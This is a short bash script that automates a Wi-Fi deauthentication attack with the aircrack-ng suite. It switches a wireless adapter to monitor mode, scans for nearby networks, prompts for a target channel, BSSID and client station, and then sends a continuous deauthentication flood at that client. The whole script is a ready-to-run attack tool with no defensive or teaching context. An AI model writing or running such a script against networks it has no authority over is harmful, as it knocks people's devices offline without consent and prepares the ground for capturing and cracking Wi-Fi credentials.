#! /bin/bash
echo "enter the name of your wifi adapter:"
read z
sudo airmon-ng check kill
sudo airmon-ng check kill
sudo ip link set $z down
sudo iw dev $z set type monitor
sudo ip link set $z up
sudo timeout 60 airodump-ng $z # you can change the time if required
echo "enter channel number of the target:"
read a
sudo iwconfig $z channel $a
echo "enter targets BSSID:"
read b
echo "enter targets STATION:"
read c
sudo aireplay-ng -0 0 -a $b -c $c $z
